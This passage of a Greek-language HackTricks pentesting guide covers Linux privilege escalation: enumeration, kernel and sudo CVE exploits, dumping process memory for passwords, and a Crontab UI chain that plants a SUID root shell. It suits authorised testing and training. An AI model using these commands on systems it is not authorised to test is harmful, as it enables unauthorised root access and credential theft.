# Κλιμάκωση προνομίων Linux

{{#include ../../../banners/hacktricks-training.md}}

Για ευρύτερο υπόβαθρο και ιστορικές ροές εργασίας enumeration, συγκρίνετε τους πόρους g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation και linux-private που παρατίθενται στις αναφορές.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Πληροφορίες συστήματος

### Πληροφορίες λειτουργικού συστήματος

Ας ξεκινήσουμε συλλέγοντας πληροφορίες για το λειτουργικό σύστημα που εκτελείται

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Διαδρομή

Αν **έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή `PATH`**, ίσως μπορέσετε να υποκλέψετε κάποιες βιβλιοθήκες ή δυαδικά αρχεία:

```bash
echo $PATH
```

### Πληροφορίες περιβάλλοντος

Ενδιαφέρουσες πληροφορίες, κωδικοί πρόσβασης ή κλειδιά API στις μεταβλητές περιβάλλοντος;

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Ελέγξτε την έκδοση του kernel και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για privilege escalation.

Η [ενότητα Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) συγκεντρώνει περιπτώσεις τοπικού privilege escalation και συνδέσμους προς τις πιο αναλυτικές παρουσιάσεις του Linux kernel στο Binary Exploitation. Επαληθεύστε το επηρεαζόμενο build και τη διαμόρφωση πριν δοκιμάσετε κάποια μελέτη περίπτωσης.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Μπορείτε να βρείτε μια καλή λίστα ευάλωτων kernels και ορισμένα ήδη **μεταγλωττισμένα exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Άλλοι ιστότοποι όπου μπορείτε να βρείτε **μεταγλωττισμένα exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξαγάγετε όλες τις ευάλωτες εκδόσεις kernel από αυτόν τον ιστότοπο, μπορείτε να εκτελέσετε:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση kernel exploits είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτελέστε το στο θύμα· ελέγχει μόνο για exploits σε kernel 2.x)

Πάντα **αναζητήστε την έκδοση του kernel στο Google**. Ίσως η έκδοση του kernel σας αναφέρεται σε κάποιο kernel exploit, οπότε θα είστε βέβαιοι ότι το exploit είναι έγκυρο.

Πρόσθετες τεχνικές kernel exploitation:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Έκδοση Sudo

Με βάση τις ευάλωτες εκδόσεις sudo που εμφανίζονται στο:

```bash
searchsploit sudo
```

Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Το upstream sudo **1.9.14 έως 1.9.17** επιτρέπει σε μη προνομιούχους τοπικούς χρήστες να αποκτήσουν δικαιώματα root μέσω της επιλογής `--chroot`, όταν το sudo φορτώνει το `/etc/nsswitch.conf` από κατάλογο που ελέγχεται από τον χρήστη· το upstream διόρθωσε το πρόβλημα στην έκδοση **1.9.17p1**. Ελέγξτε κάθε εκτελέσιμο sudo binary με root-setuid στα σχετικά paths, καθώς το `sudo -V` αναφέρει μόνο το binary που επιλέγεται μέσω του `PATH`. Τα πακέτα διανομών ενδέχεται να έχουν μεταφέρει τη διόρθωση σε παλαιότερη έκδοση χωρίς να αλλάξουν τη συμβολοσειρά έκδοσης του upstream, γι' αυτό ελέγξτε επίσης την κατάσταση του πακέτου από τον vendor. Δείτε τη [συμβουλευτική ανακοίνωση του maintainer του sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Ακολουθεί ένα [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) για την εκμετάλλευση αυτής της [ευπάθειας](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Πριν εκτελέσετε το exploit, βεβαιωθείτε ότι η έκδοση του `sudo` είναι ευάλωτη και υποστηρίζει τη λειτουργία `chroot`.

Για περισσότερες πληροφορίες, ανατρέξτε στην αρχική [συμβουλευτική ανακοίνωση για την ευπάθεια](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Παράκαμψη κανόνων sudo βάσει host (CVE-2025-32462)

Το upstream sudo **1.8.8 έως 1.9.17** μπορεί να αξιολογήσει κανόνες sudoers βάσει host χρησιμοποιώντας το **hostname που παρέχει ο χρήστης** μέσω του `sudo -h <host>` αντί για το **πραγματικό hostname**· το upstream διόρθωσε το πρόβλημα στην έκδοση **1.9.17p1**. Ο χρήστης πρέπει και πάλι να έχει αντίστοιχη καταχώριση sudoers στον επιλεγμένο host. Ελέγξτε τις διορθώσεις που έχουν μεταφερθεί από τους vendors και τα εναλλακτικά sudo binaries, καθώς και την τοπική πολιτική. Δείτε τη [συμβουλευτική ανακοίνωση του maintainer του sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Απαιτήσεις:
- Ευάλωτη έκδοση sudo
- Κανόνες sudoers ειδικοί για host (ο host δεν είναι ούτε το τρέχον hostname ούτε `ALL`)

Παράδειγμα μοτίβου sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit μέσω spoofing του επιτρεπόμενου host:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Αν η επίλυση του επιλεγμένου ονόματος αποτύχει, επαληθεύστε πώς επιλύεται αυτό το όνομα στον host. Το ότι εμφανίζεται ένα όνομα σε ένα log ή αρχείο ρυθμίσεων δεν σημαίνει ότι μπορεί να επιλυθεί, ενώ η τροποποίηση του `/etc/hosts` συνήθως απαιτεί δικαιώματα εγγραφής με αυξημένα προνόμια.

#### sudo < v1.8.28

Αυτό το [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) απαιτεί έναν ενεργό κανόνα sudo που επιτρέπει την εκτέλεση μιας εντολής ως `ALL` χρήστες, εξαιρώντας τον root, όπως `(ALL, !root) /bin/bash`. Ο καλών πρέπει επίσης να έχει δικαίωμα χρήσης αυτού του κανόνα, συμπεριλαμβανομένης τυχόν απαίτησης ελέγχου ταυτότητας. Ελέγξτε τη σχετική ανακοίνωση ασφαλείας του εγκατεστημένου πακέτου: οι προμηθευτές ενσωμάτωσαν την επιδιόρθωση σε εκδόσεις των οποίων η εμφανιζόμενη upstream έκδοση παραμένει κάτω από την 1.8.28. Ένας κανόνας `!root` ή μια παλιά έκδοση από μόνη της δεν επιβεβαιώνει ότι το σύστημα είναι ευάλωτο. Μην δοκιμάζετε προνομιούχες εντολές κατά την παθητική απαρίθμηση.

```
sudo -u#-1 /bin/bash
```

### Αποτυχία επαλήθευσης υπογραφής του dmesg

Δείτε το **smasher2 box of HTB** για ένα **παράδειγμα** του τρόπου με τον οποίο θα μπορούσε να γίνει exploit αυτής της ευπάθειας.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Περισσότερη απαρίθμηση συστήματος

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Καταγράψτε τις πιθανές άμυνες

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Αν βρίσκεστε μέσα σε ένα container, ξεκινήστε από την ακόλουθη ενότητα για την ασφάλεια των container και στη συνέχεια κάντε pivot στις σελίδες κατάχρησης που αφορούν το συγκεκριμένο runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Δίσκοι

Ελέγξτε **τι είναι προσαρτημένο και τι όχι**, πού και γιατί. Αν κάτι δεν είναι προσαρτημένο, μπορείτε να δοκιμάσετε να το προσαρτήσετε και να ελέγξετε αν περιέχει ιδιωτικές πληροφορίες.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Χρήσιμο λογισμικό

Καταγράψτε χρήσιμα εκτελέσιμα αρχεία

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Επίσης, ελέγξτε αν **είναι εγκατεστημένος κάποιος μεταγλωττιστής**. Αυτό είναι χρήσιμο αν χρειαστεί να χρησιμοποιήσετε κάποιο kernel exploit, καθώς συνιστάται να το μεταγλωττίσετε στο μηχάνημα όπου πρόκειται να το χρησιμοποιήσετε (ή σε κάποιο παρόμοιο).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Εγκατεστημένο ευάλωτο λογισμικό

Ελέγξτε την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios (για παράδειγμα), η οποία θα μπορούσε να αξιοποιηθεί για κλιμάκωση προνομίων…\
Συνιστάται να ελέγχετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Αν έχεις SSH access στο μηχάνημα, μπορείς επίσης να χρησιμοποιήσεις το **OpenVAS** για να ελέγξεις αν έχει εγκατεστημένο παρωχημένο και ευάλωτο λογισμικό.

> [!NOTE] > _Σημείωσε ότι αυτές οι εντολές εμφανίζουν πολλές πληροφορίες, οι περισσότερες από τις οποίες δεν θα είναι χρήσιμες. Γι’ αυτό συνιστάται να χρησιμοποιήσεις κάποια εφαρμογή όπως το OpenVAS ή κάποια παρόμοια, η οποία θα ελέγξει αν κάποια εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits._

## Διεργασίες

Ρίξε μια ματιά στο **ποιες διεργασίες** εκτελούνται και έλεγξε αν κάποια διεργασία έχει **περισσότερα προνόμια από όσα θα έπρεπε** (για παράδειγμα, εκτελείται κάποιο tomcat από τον root;).

```bash
ps aux
ps -ef
top -n 1
```

Να ελέγχετε πάντα αν εκτελούνται [**electron/cef/chromium debuggers**· μπορείτε να τα εκμεταλλευτείτε για privilege escalation](../../software-information/electron-cef-chromium-debugger-abuse.md). Το **Linpeas** τα εντοπίζει ελέγχοντας αν υπάρχει η παράμετρος `--inspect` στη γραμμή εντολών της διεργασίας.\
Ελέγξτε επίσης τα δικαιώματά σας στα εκτελέσιμα αρχεία των διεργασιών· ίσως μπορείτε να αντικαταστήσετε κάποιο.

### Αλυσίδες γονικών και θυγατρικών διεργασιών μεταξύ χρηστών

Μια θυγατρική διεργασία που εκτελείται ως **διαφορετικός χρήστης** από τη γονική της δεν είναι αυτομάτως κακόβουλη, αλλά αποτελεί χρήσιμο **σήμα για αρχική αξιολόγηση**. Ορισμένες μεταβάσεις είναι αναμενόμενες (`root` που εκκινεί μια υπηρεσία ως χρήστης υπηρεσίας, διαχειριστές σύνδεσης που δημιουργούν διεργασίες συνεδρίας), αλλά ασυνήθιστες αλυσίδες μπορεί να αποκαλύψουν wrappers, βοηθητικά εργαλεία εντοπισμού σφαλμάτων, persistence ή αδύναμα όρια εμπιστοσύνης κατά τον χρόνο εκτέλεσης.

Γρήγορος έλεγχος:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Αν εντοπίσετε μια απρόσμενη αλυσίδα, εξετάστε τη γραμμή εντολών της γονικής διεργασίας και όλα τα αρχεία που επηρεάζουν τη συμπεριφορά της (`config`, `EnvironmentFile`, βοηθητικά scripts, κατάλογος εργασίας, εγγράψιμα ορίσματα). Σε αρκετές πραγματικές διαδρομές privesc, το ίδιο το child δεν ήταν εγγράψιμο, αλλά ήταν το config που ελεγχόταν από το parent ή η αλυσίδα των helper.

### Διαγραμμένα εκτελέσιμα και αρχεία ανοιχτά μετά τη διαγραφή

Τα artifacts χρόνου εκτέλεσης παραμένουν συχνά προσβάσιμα **μετά τη διαγραφή**. Αυτό είναι χρήσιμο τόσο για privilege escalation όσο και για την ανάκτηση στοιχείων από μια διεργασία που έχει ήδη ανοιχτά ευαίσθητα αρχεία.

Ελέγξτε για διαγραμμένα εκτελέσιμα:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Αν το `/proc/<PID>/exe` δείχνει στο `(deleted)`, η διεργασία εξακολουθεί να εκτελεί την παλιά binary image από τη μνήμη. Αυτό είναι ισχυρή ένδειξη για περαιτέρω διερεύνηση, επειδή:

- το διαγραμμένο εκτελέσιμο μπορεί να περιέχει ενδιαφέροντα strings ή credentials
- η διεργασία που εκτελείται μπορεί να εξακολουθεί να εκθέτει χρήσιμους file descriptors
- ένα διαγραμμένο privileged binary μπορεί να υποδηλώνει πρόσφατη παραποίηση ή απόπειρα εκκαθάρισης

Συλλέξτε τα ανοιχτά διαγραμμένα αρχεία καθολικά:

```bash
lsof +L1
```

Αν εντοπίσετε έναν ενδιαφέροντα περιγραφέα, ανακτήστε τον απευθείας:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Αυτό είναι ιδιαίτερα χρήσιμο όταν μια διεργασία εξακολουθεί να έχει ανοιχτό ένα διαγραμμένο μυστικό, script, εξαγωγή βάσης δεδομένων ή αρχείο flag.

### Παρακολούθηση διεργασιών

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως το [**pspy**](https://github.com/DominicBreuker/pspy) για την παρακολούθηση διεργασιών. Αυτό μπορεί να είναι πολύ χρήσιμο για τον εντοπισμό ευάλωτων διεργασιών που εκτελούνται συχνά ή όταν πληρούνται κάποιες προϋποθέσεις.

#### Linux ProcMon μέσω sudo

Το [ProcMon για Linux](https://github.com/microsoft/ProcMon-for-Linux) μπορεί να ανιχνεύει επιλεγμένες διεργασίες και system calls και να αποθηκεύει ένα SQLite trace. Αν το `sudo -l` επιτρέπει την εκτέλεση της εντολής `procmon` χωρίς περιορισμούς και με δυνατότητες root, εξετάστε αν θα μπορούσε να παρακολουθεί την είσοδο ή την έξοδο διεργασίας άλλου χρήστη. Το δικαίωμα αυτό αποτελεί μόνο αφορμή για περαιτέρω έλεγχο: σημαντικά είναι η υποστήριξη από το tracer, η ισχύουσα πολιτική και η δραστηριότητα μιας κατάλληλης διεργασίας. Τα αρχεία trace μπορεί να περιέχουν μυστικά, γι' αυτό ελέγχετε προσεκτικά τις εξουσιοδοτημένες εξαγωγές και αποφύγετε τη συλλογή δεδομένων από άσχετες διεργασίες.

### Μνήμη διεργασιών

Ορισμένες υπηρεσίες ενός server αποθηκεύουν **διαπιστευτήρια σε απλό κείμενο στη μνήμη**.\
Συνήθως θα χρειαστείτε **προνόμια root** για να διαβάσετε τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες. Επομένως, αυτό είναι συνήθως πιο χρήσιμο όταν έχετε ήδη πρόσβαση root και θέλετε να εντοπίσετε περισσότερα διαπιστευτήρια.\
Ωστόσο, να θυμάστε ότι **ως απλός χρήστης μπορείτε να διαβάσετε τη μνήμη των διεργασιών που σας ανήκουν**.

> [!WARNING]
> Σημειώστε ότι σήμερα τα περισσότερα μηχανήματα **δεν επιτρέπουν το ptrace από προεπιλογή**, πράγμα που σημαίνει ότι δεν μπορείτε να κάνετε dump άλλων διεργασιών που ανήκουν στον μη προνομιούχο χρήστη σας.
>
> Το αρχείο _**/proc/sys/kernel/yama/ptrace_scope**_ ελέγχει την προσβασιμότητα του ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: μπορεί να γίνει debugging σε όλες τις διεργασίες, αρκεί να έχουν το ίδιο uid. Αυτός είναι ο κλασικός τρόπος λειτουργίας του ptracing.
> - **kernel.yama.ptrace_scope = 1**: μπορεί να γίνει debugging μόνο σε διεργασία-γονέα.
> - **kernel.yama.ptrace_scope = 2**: μόνο ο admin μπορεί να χρησιμοποιήσει το ptrace, καθώς απαιτείται η δυνατότητα CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: δεν μπορεί να γίνει ptrace σε καμία διεργασία. Μόλις οριστεί, απαιτείται επανεκκίνηση για να ενεργοποιηθεί ξανά το ptracing.

Μια διεργασία με το ίδιο UID που ξεκλειδώνει προσωρινά ένα password vault μπορεί να αποτελεί ξεχωριστό όριο προστασίας διαπιστευτηρίων. Όταν επιτρέπεται το tracing, μια ενεργή διεργασία που επιτρέπει τη δημιουργία dump μπορεί να αποκαλύψει τον κωδικό του vault μέσω των input syscalls ή της μνήμης της, παρόλο που το ίδιο το κρυπτογραφημένο αρχείο vault παραμένει προστατευμένο. Το `ptrace_scope=0` είναι μόνο μία από τις απαραίτητες προϋποθέσεις: σημαντικά είναι επίσης τα διαπιστευτήρια που ταιριάζουν, η δυνατότητα δημιουργίας dump της διεργασίας-στόχου, άλλα Linux security modules και η διάρκεια ζωής της διεργασίας. Για να χρησιμοποιηθεί μια καταχώριση του vault ως σύνδεση Unix root, απαιτείται ξεχωριστός έλεγχος επαναχρησιμοποίησης διαπιστευτηρίων. Η συνηθισμένη απαρίθμηση πρέπει να αναφέρει την πολιτική και τις πιθανές διεργασίες ή διαδρομές vault, όχι να καταγράφει την είσοδο ή να εμφανίζει μυστικά. Δείτε την [τεκμηρίωση Yama του kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) και τους [ελέγχους πρόσβασης ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Αν έχετε πρόσβαση στη μνήμη μιας υπηρεσίας FTP, για παράδειγμα, θα μπορούσατε να πάρετε το Heap και να αναζητήσετε μέσα σε αυτό τα διαπιστευτήριά της.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB Script

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Για ένα δεδομένο process ID, το **maps δείχνει πώς αντιστοιχίζεται η μνήμη στον** εικονικό χώρο διευθύνσεων **αυτής της διεργασίας**· δείχνει επίσης τα **δικαιώματα πρόσβασης κάθε αντιστοιχισμένης περιοχής**. Το pseudo file **mem εκθέτει την ίδια τη μνήμη της διεργασίας**. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τα offsets τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **μεταβούμε στο κατάλληλο σημείο του αρχείου mem και να αποθηκεύσουμε όλες τις αναγνώσιμες περιοχές** σε ένα αρχείο.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

Το `/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος και όχι στην εικονική μνήμη. Ο χώρος εικονικών διευθύνσεων του kernel είναι προσβάσιμος μέσω του `/dev/kmem`.\
Συνήθως, το `/dev/mem` είναι αναγνώσιμο μόνο από τον **root** και την ομάδα **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump για Linux

Το ProcDump είναι μια επανεκδοχή για Linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Αποκτήστε το από το [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Εργαλεία

Για να κάνετε dump τη μνήμη μιας διεργασίας, μπορείτε να χρησιμοποιήσετε:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε να αφαιρέσετε χειροκίνητα τις απαιτήσεις για root και να κάνετε dump τη διεργασία που σας ανήκει
- Το Script A.5 από το [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Διαπιστευτήρια από τη μνήμη διεργασίας

#### Χειροκίνητο παράδειγμα

Αν διαπιστώσετε ότι εκτελείται η διεργασία authenticator:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Μπορείτε να κάνετε dump τη διεργασία (δείτε τις προηγούμενες ενότητες για να βρείτε διαφορετικούς τρόπους να κάνετε dump τη μνήμη μιας διεργασίας) και να αναζητήσετε διαπιστευτήρια στη μνήμη:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **υποκλέψει διαπιστευτήρια σε clear text από τη μνήμη** και από ορισμένα **γνωστά αρχεία**. Για να λειτουργήσει σωστά, απαιτεί δικαιώματα root.

| Λειτουργία                                       | Όνομα διεργασίας    |
| ------------------------------------------------- | -------------------- |
| Κωδικός πρόσβασης GDM (Kali Desktop, Debian Desktop) | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Ενεργές συνδέσεις FTP)                   | vsftpd               |
| Apache2 (Ενεργές συνεδρίες HTTP Basic Auth)       | apache2              |
| OpenSSH (Ενεργές συνεδρίες SSH - χρήση Sudo)      | sshd:                |

#### Αναζήτηση Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Προγραμματισμένες εργασίες/Cron

### Crontab UI (alseambusher) που εκτελείται ως root – privesc μέσω web-based scheduler

Αν ένας web πίνακας «Crontab UI» (alseambusher/crontab-ui) εκτελείται ως root και είναι δεσμευμένος μόνο στη loopback, μπορείτε και πάλι να αποκτήσετε πρόσβαση μέσω SSH local port-forwarding και να δημιουργήσετε μια προνομιούχα εργασία για να κλιμακώσετε τα δικαιώματά σας.<sup>[[1]](#references)[[4]](#references)</sup>

Τυπική αλυσίδα
- Εντοπίστε μια θύρα προσβάσιμη μόνο μέσω loopback (π.χ., 127.0.0.1:8000) και το Basic-Auth realm μέσω `ss -ntlp` / `curl -v localhost:8000`
- Βρείτε διαπιστευτήρια σε λειτουργικά τεκμήρια:
  - Αντίγραφα ασφαλείας/σενάρια με `zip -P <password>`
  - Μονάδα systemd που εκθέτει `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Δημιουργήστε tunnel και συνδεθείτε:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Δημιουργήστε μια εργασία με υψηλά προνόμια και εκτελέστε την αμέσως (τοποθετεί ένα SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Χρησιμοποιήστε το:
```bash
/tmp/rootshell -p   # root shell
```

Ενίσχυση ασφάλειας
- Μην εκτελείτε το Crontab UI ως root· περιορίστε το με αποκλειστικό χρήστη και ελάχιστα δικαιώματα
- Κάντε bind στο localhost και περιορίστε επιπλέον την πρόσβαση μέσω firewall/VPN· μην επαναχρησιμοποιείτε κωδικούς πρόσβασης
- Αποφύγετε την ενσωμάτωση μυστικών σε unit files· χρησιμοποιήστε secret stores ή EnvironmentFile με πρόσβαση μόνο από root
- Ενεργοποιήστε audit/logging για εκτελέσεις εργασιών κατ’ απαίτηση

Ελέγξτε αν κάποια προγραμματισμένη εργασία είναι ευάλωτη. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται από τον root (wildcard vuln; μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί ο root; να χρησιμοποιήσετε symlinks; να δημιουργήσετε συγκεκριμένα αρχεία στον κατάλογο που χρησιμοποιεί ο root;).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Αν χρησιμοποιείται το `run-parts`, ελέγξτε ποια ονόματα θα εκτελεστούν στην πράξη:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Αυτό αποτρέπει τα false positives. Ένας εγγράψιμος περιοδικός κατάλογος είναι χρήσιμος μόνο αν το όνομα του payload ταιριάζει με τους τοπικούς κανόνες του `run-parts`.

### Διαδρομή Cron

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείτε να βρείτε το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Παρατηρήστε ότι ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

Αν μέσα σε αυτό το crontab ο χρήστης root προσπαθήσει να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει το path. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\
Τότε, μπορείτε να αποκτήσετε ένα root shell χρησιμοποιώντας:

```bash
